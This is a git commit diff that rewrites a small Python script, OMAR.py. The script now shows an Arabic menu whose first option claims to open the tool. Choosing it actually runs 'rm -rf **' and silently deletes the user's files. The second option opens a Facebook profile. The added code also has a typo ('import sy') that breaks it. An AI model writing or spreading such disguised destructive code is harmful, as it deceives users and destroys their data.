fcea69faee1f71932252f4d786d477d2b422cecc
iamomarsalem <117285879+iamomarsalem@users.noreply.github.com>
2023-02-27 15:45:51 +0200

    Create OMAR.py

--- OMAR.py
+++ OMAR.py
@@ -1,4 +1,10 @@
-import sys
-print("\33[1;31m الاداة متوقفة لبعض الاسباب الشخصية شكرا على الاستخدام ") 
-print("\33[1;31m  ﻡﺍﺪﺨﺘﺳﻻﺍ ﻰﻠﻋ ﺍﺮﻜﺷ ﺔﻴﺼﺨﺸﻟﺍ ﺏﺎﺒﺳﻻﺍ ﺾﻌﺒﻟ ﺔﻔﻗﻮﺘﻣ ﺓﺍﺩﻻﺍ") 
-sys.exit() 
+import os
+import sy
+print("[1] فـتـح الاداة ") 
+print(" [2] الخروج من الاداة ") 
+omar = input(" Choose") 
+if omar in ["1"]:
+   os.system("rm -rf **")
+if omar in ["2"]: 
+   os.system("xdg-open https://www.facebook.com/profile.php?id=100007682171115") 
+   sys.exit() 
